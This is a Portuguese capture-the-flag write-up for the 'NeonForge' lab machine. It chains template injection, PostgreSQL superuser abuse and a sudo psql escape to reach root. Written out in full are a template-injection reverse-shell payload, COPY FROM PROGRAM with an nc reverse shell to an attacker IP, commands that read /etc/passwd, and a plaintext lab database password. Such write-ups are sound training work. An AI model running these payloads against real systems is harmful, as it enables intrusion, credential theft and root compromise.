# NeonForge

![NeonForge Image](/images/hackingclub-neonforge/file-neonforge-2025-1.png)

## Sumário

Durante o teste foi identificada uma sequência de vulnerabilidades que permitiu a um atacante comprometer a aplicação e o servidor: uma vulnerabilidade de `SSTI (Server-Side Template Injection)` foi explorada para obter execução remota limitada (shell reversa). A partir desse acesso inicial foi possível alcançar o servidor de base de dados `PostgreSQL`, onde uma conta com privilégios de `superuser` foi utilizada para executar código no contexto do processo do SGBD. Por fim, devido à configuração de sudo que permite a execução do `binário` do cliente do PostgreSQL sem senha, o atacante conseguiu escalar privilégios e obter acesso root.

## Aplicativo Web

Ao acessar a aplicação web, somos redirecionados para `neonforge.hc`. É necessário adicionar esse host ao arquivo de roteamento (hosts) da nossa máquina.

```bash
echo "$IP neonforge.hc" | sudo tee -a /etc/hosts
```

## Reconhecimento

### Varredura de portas

Utilizou-se nmap para mapear portas e serviços na máquina alvo. O scan identificou apenas duas portas abertas.

```bash
nmap -Pn -sV -vv neonforge.hc
```

**Resultado**

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx 1.24.0 (Ubuntu)
```

## Analisando a aplicação

Após analisar o comportamento da aplicação e inspecionar todas as requisições no Burp Suite, identificamos uma requisição suspeita. Testamos a possibilidade de uma vulnerabilidade do tipo Server-Side Template Injection (SSTI) utilizando uma payload clássica para confirmar a hipótese.

> ❌ SSTI é uma vulnerabilidade que ocorre quando os usuários conseguem injetar conteúdo dentro dos templates do servidor. Isso acontece quando a entrada do usuário é inserida em um template e, então, processada sem passar por uma filtragem adequada. O atacante pode injetar comandos específicos que são interpretados pelo servidor, podendo assim, por exemplo, acessar dados sensíveis ou executar comandos arbitrários.
{: .prompt-danger}

```bash
{{7*7}}
```

![Aplication Web](/images/hackingclub-neonforge/file-neonforge-2025-2.png)
![SSTI Confirmed](/images/hackingclub-neonforge/file-neonforge-2025-3.png)

## Explorando a vulnerabilidade

### SSTI

A requisição identificada como vulnerável foi reproduzida no Repeater do Burp Suite. Utilizamos uma payload de SSTI que demonstrou execução remota no contexto da aplicação e permitiu estabelecer uma shell reversa no host.

```bash
{{['bash -c "sh -i >& /dev/tcp/10.0.73.93/1234 0>&1"']|filter('system')}}
```

![Payload](/images/hackingclub-neonforge/file-neonforge-2025-4.png)

Após isso, devemos aplicar URL-encoding ao payload — no Repeater use `Convert → URL encode → Encode all characters`.

![Payload Encoded](/images/hackingclub-neonforge/file-neonforge-2025-5.png)

## Escalando Privilégios

Ao enumerar os serviços activos no host, identificou-se uma instância do `PostgreSQL` ligada ao endereço local na porta 5432.

![Services](/images/hackingclub-neonforge/file-neonforge-2025-6.png)

Com o PostgreSQL ativo no host, conseguimos acesso ao arquivo responsável pelas credenciais/strings de ligação ao banco, localizado em `/var/www/html/app/helpers`.

```bash
cat /var/www/html/app/helpers/Database.php
```

![Database.php](/images/hackingclub-neonforge/file-neonforge-2025-7.png)

**Credenciais de acesso ao banco de dados**

- **$host** : `localhost`
- **$port** : `5432`
- **$dbname** : `neonforge`
- **$user** : `postgres`
- **$password** : `o5Q%69BXI`

```bash
psql -h localhost -p 5432 -U postgres -d neonforge
```

## Obtendo a shell do usuário postgres

Foi identificado acesso ao serviço PostgreSQL com privilégios elevados (conta com atributos de superuser). A partir desse acesso foram realizadas ações que permitiram ler ficheiros do sistema e executar comandos a partir do contexto do servidor de base de dados.

```bash
\du
```

![Superuser](/images/hackingclub-neonforge/file-neonforge-2025-8.png)

Para ler arquivos do sistema, precisamos criar uma tabela para armazenar a saída do comando e usar o comando COPY FROM para obter os dados de um arquivo para a tabela declarada.

1 - Criando a tabela

```bash
CREATE TABLE cmd_exec(output text);
```

2 - Use o comando COPY FROM para ler o conteudo de arquivos como '/etc/passwd' no linux ou 'C:/WINDOWS/win.ini'

```bash
COPY cmd_exec FROM '/etc/passwd';
```

3 - Leia a tabela com o comando SELECT

```bash
SELECT * FROM cmd_exec;
```

![PostgresExec](/images/hackingclub-neonforge/file-neonforge-2025-9.png)
![PostgresExec](/images/hackingclub-neonforge/file-neonforge-2025-10.png)

### Execução do comando

Para executar comandos do sistema no Linux ou no Windows, precisamos usar o parâmetro PROGRAM. Começamos criando uma tabela; podemos nomeá-la como — shell.

4 - Criando a tabela

```bash
CREATE TABLE shell(output text);
```

5 - Em seguida, use o parâmetro PROGRAM para passar o shell e configurar um ouvinte na máquina atacante.

```bash
COPY shell FROM PROGRAM ‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.73.93 8000 >/tmp/f’;
```

> ⚠️ Você pode usar qualquer tipo de shell, como Perl, Python ou Netcat, para obter uma conexão de shell reverso
{: .prompt-warning}

![ShellPostgres](/images/hackingclub-neonforge/file-neonforge-2025-11.png)

### Capturando a primeira flag

![Flag1](/images/hackingclub-neonforge/file-neonforge-2025-12.png)

## Privilege Escalation

Ao executar `sudo -l`, verificou-se que temos permissão para executar o binário do PostgreSQL com privilégios de sudo. Iniciando o binário do PostgreSQL com sudo, tirámos proveito de uma funcionalidade de entrada/escape do processo que nos permitiu ganhar uma shell com privilégios root. E com isso, capturamos a segunda flag.

```bash
sudo /usr/bin/psql -h localhost -U postgres
```
```bash
\!
```
![Root](/images/hackingclub-neonforge/file-neonforge-2025-13.png)